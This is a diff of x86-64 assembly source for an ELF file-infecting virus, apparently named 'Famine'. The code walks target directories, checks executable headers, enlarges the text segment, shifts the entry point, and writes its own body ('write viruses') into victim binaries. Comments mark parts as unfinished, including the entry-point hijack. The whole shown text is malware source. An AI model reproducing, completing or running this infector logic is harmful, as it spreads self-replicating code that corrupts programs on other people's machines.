@@ -38,13 +38,13 @@ open_dir:
     add rsi, 256                                       ; offset struct dirent
     mov rdx, 1024
     syscall
-    mov r8, rax
+    mov r13, rax
     mov rax, SYS_CLOSE
     syscall
     xor rbx, rbx                                       ; buffer offset
 
 find_file:
-    cmp rbx, r8
+    cmp rbx, r13
     jge next_dir
     lea rsi, [rsp + 256]                                ; struct
     add rsi, rbx                                        ; current offset
@@ -128,9 +128,9 @@ elf_header:
     .exec:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
         je elf_phdr
-    .dyn:
-        cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
-        je elf_phdr
+    ; .dyn:                                                 ; NOT YET ?
+        ; cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
+        ; je elf_phdr
     ; if (ehdr->e_machine != EM_X86_64)                     NEED TO ADD THIS PROBABLY.
     jmp clear
 %ifdef DEBUG
@@ -187,6 +187,7 @@ patch_segtext:
         sub [rdx + phdr64.p_paddr], rsi
         add [rdx + phdr64.p_filesz], rsi
         add [rdx + phdr64.p_memsz], rsi
+        ; add qword [rdx + phdr64.p_align], 0x1000          ; PADDDING
         mov al, 1
     .keep:
         add rdx, 0x38                                       ; next phdr
@@ -195,7 +196,7 @@ patch_segtext:
 patch_hdr:
     test al, al
     je clear                                               ; NEED TO JUMP TO MUMMAP.
-    add qword [rdi + Elf64_Ehdr.e_entry], 0x40               ; new entry  + sizeof(elf_hdr)
+    add qword [rdi + Elf64_Ehdr.e_entry], 0x40             ; new entry  + sizeof(elf_hdr)
 
 patch_shdr:
     mov rax, [rbp - 16]                                    ;EHDR
@@ -222,19 +223,27 @@ mimic:
     syscall
     cmp rax, 0
     jl clear
+;write header
     mov r8, rax
     mov rdi, r8
     mov rsi, [rbp - 16]
     mov rdx, 64                                                    ; header
     mov rax, SYS_WRITE
     syscall
-
+; write viruses
     mov rdi, r8
     lea rsi, [rel _famine]
     mov rdx, FAMINE_SIZE
     mov rax, SYS_WRITE
     syscall
 
+    ; NEED TO PATCH ENTRYPOINT AND WRITE OPCODE x64.
+    ; mov rdi, [rbp - 16]
+    ; mov rdi, [rdi + Elf64_Ehdr.e_entry]
+    ; mov [rsp], byte 0xb8
+    ; mov [rsp + 1], [rdi]
+    ; mov [rsp + 9], 
+; padding
     PAGE_ALIGN FAMINE_SIZE
     sub rcx, FAMINE_SIZE
     mov r9, rcx
@@ -248,7 +257,7 @@ mimic:
         syscall
         sub r9, 1
         jmp .loop
-    
+; file
     .keep:
         mov rdi, r8
         mov rax, [rbp - 16]
@@ -260,9 +269,16 @@ mimic:
         syscall
     ;;;;;; NEED TO WRITE ENTRYPOINT SOMEWHAT.
 clear:
+;munmap
+    mov rdi, [rbp - 16]
+    mov rsi, [rsp + FILE_SIZE + DIRENT + 48]
+    mov rax, SYS_MUNMAP
+    syscall
+; close fd
     mov rdi, r8
     mov rax, SYS_CLOSE
     syscall
+
     ; MUNMAP
 next_file:
     ; maybe RBX not valid anymore aswell.
@@ -274,19 +290,22 @@ next_file:
     jmp find_file
 
 next_dir:
-    mov rcx, rbx                                            ; maybe push RBX before
-    memset [rsp + 256], rcx                                 ; dirent memset
+    ; mov rcx, rbx                                            ; maybe push RBX before
+    mov rcx, 1024
+    memset [rsp + 256], rcx                                ; dirent memset
     .next:
         cmp r14, 1
         jge target_dir.f2
 
-quit:
+clean:
     add rsp, FILE_SIZE + DIRENT + FSTAT + MAPPED_FILE
     POP
 
+_v_stop:
     mov rax, SYS_EXIT 
     mov rdi, 0
     syscall
+
 hook:
     .folder_1:
         db FOLDER_1, 0
